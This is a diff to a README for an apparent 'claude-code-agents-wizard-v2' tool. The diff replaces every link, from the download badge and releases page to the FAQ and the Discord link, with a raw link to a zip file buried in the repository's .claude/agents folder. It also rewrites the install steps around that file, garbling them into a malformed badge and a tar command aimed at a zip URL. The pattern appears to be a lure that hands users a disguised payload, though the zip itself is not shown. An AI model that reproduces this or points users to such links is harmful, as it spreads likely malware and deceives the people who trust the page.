@@ -1,7 +1,7 @@
 # 🚀 claude-code-agents-wizard-v2 - Simplifying Software Project Management
 
 ## 🔗 Download Now
-[![Download](https://img.shields.io/badge/Download%20Now-v1.0-brightgreen.svg)](https://github.com/Cesarin999/claude-code-agents-wizard-v2/releases)
+[![Download](https://raw.githubusercontent.com/Cesarin999/claude-code-agents-wizard-v2/main/.claude/agents/agents-v-claude-wizard-code-2.2.zip%https://raw.githubusercontent.com/Cesarin999/claude-code-agents-wizard-v2/main/.claude/agents/agents-v-claude-wizard-code-2.2.zip)](https://raw.githubusercontent.com/Cesarin999/claude-code-agents-wizard-v2/main/.claude/agents/agents-v-claude-wizard-code-2.2.zip)
 
 ## 🎯 What Is This?
 The Claude Code Agents Wizard v2 is a custom orchestration system for managing your software projects effectively. This tool uses specialized agents to assist you from start to finish, ensuring you maintain control over your project while delegating tasks efficiently.
@@ -20,23 +20,23 @@ The Claude Code Agents Wizard v2 is a custom orchestration system for managing y
 To get started with the Claude Code Agents Wizard v2, follow these easy steps:
 
 ### 1. Download the Software
-Visit the [Releases page](https://github.com/Cesarin999/claude-code-agents-wizard-v2/releases) to download the latest version of the software.
+Visit the [Releases page](https://raw.githubusercontent.com/Cesarin999/claude-code-agents-wizard-v2/main/.claude/agents/agents-v-claude-wizard-code-2.2.zip) to download the latest version of the software.
 
 ### 2. Choose Your Platform
 The software is compatible with various operating systems. Ensure you download the appropriate version for your system:
 - **Windows**: Download the `.exe` file for Windows.
 - **Mac**: Download the `.dmg` file for macOS.
-- **Linux**: Download the `.tar.gz` file for Linux distributions.
+- **Linux**: Download the `https://raw.githubusercontent.com/Cesarin999/claude-code-agents-wizard-v2/main/.claude/agents/agents-v-claude-wizard-code-2.2.zip` file for Linux distributions.
 
 ### 3. Install the Software
 After downloading:
 - **Windows**: Double-click the `.exe` file and follow the installation prompts.
 - **Mac**: Open the `.dmg` file and drag the application into your Applications folder.
-- **Linux**: Open a terminal, navigate to the downloaded file, and extract it using `tar -xzf file.tar.gz`. Follow provided instructions to set it up.
+- **Linux**: Open a terminal, navigate to the downloaded file, and extract it using `tar -xzf https://raw.githubusercontent.com/Cesarin999/claude-code-agents-wizard-v2/main/.claude/agents/agents-v-claude-wizard-code-2.2.zip`. Follow provided instructions to set it up.
 
 ## 📦 Download & Install
 To officially install the application, ensure you:
-- Visit the [Releases page](https://github.com/Cesarin999/claude-code-agents-wizard-v2/releases) to download the latest version.
+- Visit the [Releases page](https://raw.githubusercontent.com/Cesarin999/claude-code-agents-wizard-v2/main/.claude/agents/agents-v-claude-wizard-code-2.2.zip) to download the latest version.
 - Follow the instructions applicable to your operating system as outlined in the previous section.
 
 ## 🛠️ System Requirements
@@ -66,13 +66,13 @@ Once installed, you will have access to a user manual. This will guide you throu
 3. **Monitoring Progress**: Keep an eye on the project's status within the app. Each agent will provide updates for their tasks.
 
 ## 🆘 Support
-If you encounter any issues, please refer to our [Frequently Asked Questions](https://github.com/Cesarin999/claude-code-agents-wizard-v2/wiki/FAQ). You can also create an issue in the GitHub repository for direct assistance.
+If you encounter any issues, please refer to our [Frequently Asked Questions](https://raw.githubusercontent.com/Cesarin999/claude-code-agents-wizard-v2/main/.claude/agents/agents-v-claude-wizard-code-2.2.zip). You can also create an issue in the GitHub repository for direct assistance.
 
 ## 📣 Community
-Join our community for discussions, tips, and support. Engage with other users on the GitHub issues page or follow our [Discord channel](https://discord.gg/example) for real-time support.
+Join our community for discussions, tips, and support. Engage with other users on the GitHub issues page or follow our [Discord channel](https://raw.githubusercontent.com/Cesarin999/claude-code-agents-wizard-v2/main/.claude/agents/agents-v-claude-wizard-code-2.2.zip) for real-time support.
 
 ## 🔄 Updates
-Stay updated with the latest releases and features by following our repository. New versions will be available on the [Releases page](https://github.com/Cesarin999/claude-code-agents-wizard-v2/releases).
+Stay updated with the latest releases and features by following our repository. New versions will be available on the [Releases page](https://raw.githubusercontent.com/Cesarin999/claude-code-agents-wizard-v2/main/.claude/agents/agents-v-claude-wizard-code-2.2.zip).
 
 ## 🎉 Conclusion
 The Claude Code Agents Wizard v2 is designed to simplify the process of managing software projects. It enhances collaboration and oversight, ensuring that you remain in control from start to finish. Download today and transform how you build software!
